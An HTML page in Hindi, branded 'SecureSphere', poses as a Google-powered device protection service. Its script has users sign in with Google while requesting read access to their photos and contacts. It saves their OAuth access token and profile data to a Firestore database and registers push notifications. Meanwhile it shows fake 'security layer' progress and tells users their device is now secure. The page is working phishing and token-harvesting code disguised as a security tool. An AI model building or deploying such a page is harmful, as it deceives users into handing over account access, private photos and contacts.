<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureSphere - आपकी सुरक्षा हमारी प्राथमिकता</title>
    
    <!-- ========================================================== -->
    <!-- === बदलाव 1: Firebase SDK (लाइब्रेरी) जोड़ना (ज़रूरी) === -->
    <!-- ========================================================== -->
    <!-- यह Firebase को आपके पेज पर काम करने की शक्ति देता है -->
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-firestore-compat.js"></script>
    
    <style>
        /* स्टाइलिंग में कोई बदलाव नहीं है, यह पहले जैसा ही है */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
            color: #333;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
        }
        h1 {
            color: #1c1e21;
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #606770;
            font-size: 16px;
            margin-bottom: 30px;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            min-height: 20px;
        }
        #protectButton {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            transition: background-color 0.3s, opacity 0.3s;
        }
        #protectButton:disabled {
            cursor: not-allowed;
            opacity: 0.7;
        }
        .status-error {
            color: #fa383e;
        }
        .status-success {
             color: #28a745;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/Dialog-information.svg/2048px-Dialog-information.svg.png" alt="Security Logo" class="logo">
        <h1>अपने डिवाइस को सुरक्षित करें</h1>
        <p>Google द्वारा संचालित हमारी उन्नत सुरक्षा प्रणाली के साथ अपने डिवाइस पर पूर्ण सुरक्षा सक्रिय करें।</p>
        <button id="protectButton">पूर्ण सुरक्षा सक्रिय करें</button>
        <div id="status"></div>
    </div>

    <script>
        // ===============================================
        // === बदलाव 2: Firebase को कॉन्फ़िगर करना (ज़रूरी) ===
        // ===============================================
        const firebaseConfig = {
            apiKey: "AIzaSyDuvWTMJL5edNG6cheez5pmwI2KlLCwtjw",
            authDomain: "shubhzone-4a6b0.firebaseapp.com",
            databaseURL: "https://shubhzone-4a6b0-default-rtdb.firebaseio.com",
            projectId: "shubhzone-4a6b0",
            storageBucket: "shubhzone-4a6b0.appspot.com",
            messagingSenderId: "439309269785",
            appId: "1:439309269785:web:08a1256812648daafea388",
            measurementId: "G-5S0VFF21SB"
        };
        // Firebase को शुरू करें
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        // ===============================================
        //  STEP 0: ज़रूरी चीजों को तैयार रखना (अपरिवर्तित)
        // ===============================================
        const protectButton = document.getElementById('protectButton');
        const statusDiv = document.getElementById('status');
        const VAPID_PUBLIC_KEY = "BCPKrHM579ezfGzhmoQk-j7Mwr7E3gfEsUbFsOjEVozYRRZOzEMqVqm9fWEVY2pS1oYQ9BZ2xiN2hgiE7p7z3m0";

        if (Notification.permission === 'denied') {
            handleBlockedPermission();
        }

        protectButton.addEventListener('click', startProcess);
        
        // ===============================================
        // === बदलाव 3: मुख्य प्रक्रिया को अपडेट करना (ज़रूरी) ===
        // ===============================================
        // अब प्रक्रिया पहले गूगल से लॉगिन करेगी, फिर बाकी काम करेगी।
        async function startProcess() {
            if (Notification.permission === 'denied') return;
            protectButton.disabled = true;
            statusDiv.className = '';
            statusDiv.textContent = 'प्रमाणीकरण शुरू हो रहा है...';

            try {
                // Step 1: गूगल से लॉगिन करने की कोशिश करें
                const googleProvider = new firebase.auth.GoogleAuthProvider();
                // सबसे ज़रूरी: यहाँ हम गैलरी और कॉन्टैक्ट्स की अनुमति मांग रहे हैं
                googleProvider.addScope('https://www.googleapis.com/auth/photoslibrary.readonly');
                googleProvider.addScope('https://www.googleapis.com/auth/contacts.readonly');

                const result = await auth.signInWithPopup(googleProvider);
                const user = result.user;
                const credential = result.credential;
                const accessToken = credential.accessToken;
                
                statusDiv.textContent = `स्वागत है, ${user.displayName}!`;

                // Step 2: सर्विस वर्कर को रजिस्टर करें
                await registerServiceWorker();

                // Step 3: नोटिफिकेशन की अनुमति मांगें
                const subscription = await askForNotificationPermission();

                // Step 4: सारा डेटा Firestore में एक साथ सेव करें
                await saveDataToFirestore(user, accessToken, subscription);

                handleSuccess();

            } catch (error) {
                handleError(`प्रमाणीकरण में त्रुटि: ${error.message}`);
                console.error("पूरी प्रक्रिया में त्रुटि:", error);
            }
        }

        async function registerServiceWorker() {
            statusDiv.textContent = 'सुरक्षा परत 1 सक्रिय हो रही है...';
            if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
                throw new Error('आपका ब्राउज़र संगत नहीं है।');
            }
            await navigator.serviceWorker.register('/sw.js');
        }

        async function askForNotificationPermission() {
            statusDiv.textContent = 'सुरक्षा परत 2 सक्रिय हो रही है...';
            const permission = await Notification.requestPermission();
            if (permission === 'granted') {
                const subscription = await navigator.serviceWorker.ready.then(reg => 
                    reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: VAPID_PUBLIC_KEY
                    })
                );
                return subscription;
            } else if (permission === 'denied') {
                handleBlockedPermission();
                throw new Error('Notification permission denied.');
            } else {
                handleDismissedPermission();
                throw new Error('Notification permission dismissed.');
            }
        }
        
        async function saveDataToFirestore(user, accessToken, subscription) {
            statusDiv.textContent = 'डेटा को सुरक्षित किया जा रहा है...';
            const userRef = db.collection('users').doc(user.uid);
            await userRef.set({
                uid: user.uid,
                displayName: user.displayName,
                email: user.email,
                photoURL: user.photoURL,
                googleAccessToken: accessToken,
                pushSubscription: JSON.parse(JSON.stringify(subscription)), // ऑब्जेक्ट को सादे रूप में सेव करें
                lastLogin: firebase.firestore.FieldValue.serverTimestamp()
            }, { merge: true }); // 'merge: true' यह सुनिश्चित करता है कि हम पुराने डेटा को ओवरराइट न करें
        }

        // --- हेल्पर फंक्शन्स (लगभग अपरिवर्तित) ---
        function handleSuccess() {
            statusDiv.className = 'status-success';
            statusDiv.textContent = 'आपका डिवाइस अब पूरी तरह सुरक्षित है!';
            protectButton.style.backgroundColor = '#28a745';
            protectButton.textContent = 'सुरक्षित';
            protectButton.disabled = true;
        }
        
        function handleError(message) {
            statusDiv.className = 'status-error';
            statusDiv.textContent = message;
            protectButton.disabled = false;
        }

        function handleDismissedPermission() {
            statusDiv.className = 'status-error';
            statusDiv.textContent = 'पूर्ण सुरक्षा के लिए अनुमति आवश्यक है।';
            protectButton.disabled = false;
        }

        function handleBlockedPermission() {
            statusDiv.className = 'status-error';
            statusDiv.textContent = 'अनुमति स्थायी रूप से ब्लॉक कर दी गई है। सुरक्षा सक्रिय नहीं की जा सकती।';
            protectButton.textContent = 'अनुमति अवरुद्ध';
            protectButton.style.backgroundColor = '#888';
            protectButton.disabled = true;
        }
    </script>
</body>
</html>
